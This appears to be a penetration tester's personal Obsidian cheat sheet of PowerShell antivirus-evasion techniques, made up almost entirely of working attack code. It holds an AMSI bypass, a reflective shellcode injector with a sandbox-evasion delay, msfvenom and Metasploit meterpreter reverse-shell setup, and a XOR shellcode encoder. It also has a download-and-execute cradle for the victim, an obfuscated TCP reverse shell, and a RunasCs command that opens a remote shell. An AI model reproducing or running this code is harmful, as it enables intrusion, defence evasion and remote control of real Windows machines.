---
creation date: April 6th 2023
last modified date: April 6th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Powershell AV bypasses]]  
___

## Description:  

**Reverse shell**
**Reflective Injector**
ReflectiveInjector.ps1 PowerShell. Need to add XOR shellcode to line 34 ($buf = 0xEA,0x5E,0x95...). change line 35 if you change the xor key.
```
foreach($type in [Ref].Assembly.GetTypes()) {if ($type.Name -like "*iUtils") {$aType=$type}}
foreach($field in $aType.GetFields('NonPublic,Static')) {if ($field.Name -like "*Context") {$cntxt=$field}}
[IntPtr]$ptr=$cntxt.GetValue($null)
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$starttime = Get-Date -Displayhint Time
Start-sleep -s 5
$finishtime = Get-Date -Displayhint Time
if ( $finishtime -le $starttime.addseconds(4.5) ) { exit }

###
# edits go here
$sacproc = "C:\Windows\System32\upnpcont.exe"
#[Byte[]] $buf =  0xEA,0x5E,0x95...
for ($abc = 0; $abc -lt $buf.Count; $abc++) { $buf[$abc] = $buf[$abc] -bxor 22}
###

$proc = Start-Process $sacproc -PassThru -WindowStyle Hidden
$procid = $proc.Id

$hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $procid)
$addr= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hprocess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
[Int32]$lpNumberOfBytesWritten = 0
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType())([bool]))).Invoke($hprocess, $addr, $buf, $buf.length, [ref]$lpNumberOfBytesWritten) 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke($hprocess,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)
```
Generate a payload:
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.128 LPORT=443 -f ps1

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
```
Powershell XOR shell (`pwsh` on kali will drop you to a powershell and can run the script)
```
# Edit these:
#[Byte[]] $buf = 0xfc,0xe8,0x8f...
$xor_key = 22

$buffer_line = '[Byte[]] $buf =  '

for ($def = 0; $def -lt $buf.Count; $def++) {
	$buf[$def] = $buf[$def] -bxor $xor_key
	$y = [System.BitConverter]::ToString($buf[$def]);
	$buffer_line += '0x' + $y
	if ($def -ne ($buf.Count - 1)) {
		$buffer_line += ','
	}
}

$decrypt_block = 'for ($abc = 0; $abc -lt $buf.Count; $abc++) { $buf[$abc] = $buf[$abc] -bxor ' + $xor_key + '}'

Write-Output $buffer_line
Write-Output $decrypt_block
```
Script that runs on victim
```
foreach($type in [Ref].Assembly.GetTypes()) {if ($type.Name -like "*iUtils") {$aType=$type}}
foreach($field in $aType.GetFields('NonPublic,Static')) {if ($field.Name -like "*Context") {$cntxt=$field}}
[IntPtr]$ptr=$cntxt.GetValue($null)
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
iex(new-object net.webclient).downloadstring("http://10.10.14.10/ReflectiveInjector.ps1")
```

make sure to host the ReflectiveInjector on port 80 and set up a Metasploit handler on 443

**Run a process as a different user (with creds)**
[RunasCs](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)
```
Invoke-RunasCs -Username snovvcrash -Password 'Passw0rd!' -Domain megacorp.local -Command powershell.exe -Remote 10.10.13.37:1337
```


**ASMI bypass**
```
while ($true) {$px = "c0","a8","38","1";$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.';$w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n";$s = [System.Text.ASCIIEncoding];[byte[]]$b = 0..65535|%{0};$x = "n-eiorvsxpk5";Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);$y = New-Object System.Net.Sockets.TCPClient($p,80);$z = $y.GetStream();$d = $s::UTF8.GetBytes($w);$z.Write($d, 0, $d.Length);$t = (n-eiorvsxpk5 whoami) + "$ ";while(($l = $z.Read($b, 0, $b.Length)) -ne 0){;$v = (New-Object -TypeName $s).GetString($b,0, $l);$d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t);$z.Write($d, 0, $d.Length);}$y.Close();Start-Sleep -Seconds 5}
```
You have to change your IP address to hex (`$px = "c0","a8","38","1"`add 0 in front if needed) and change your port number (`($p,80)`)

**Obfuscated PowerShell Reverse Shells**
[gh0x0st](https://github.com/gh0x0st/Get-ReverseShell)

**Run a new PowerShell command in background**
```
start-job -scriptblock { C:\TeamCity\buildAgent\work\74c2f03019966b3e\hello_world.ps1 }

Start-Process powershell.exe -ArgumentList "-file C:\TeamCity\buildAgent\work\74c2f03019966b3e\hello_world.ps1"

```
Can sometimes avoid detection by not having your process run a new job as a child



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: April 6th 2023 (09:32 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
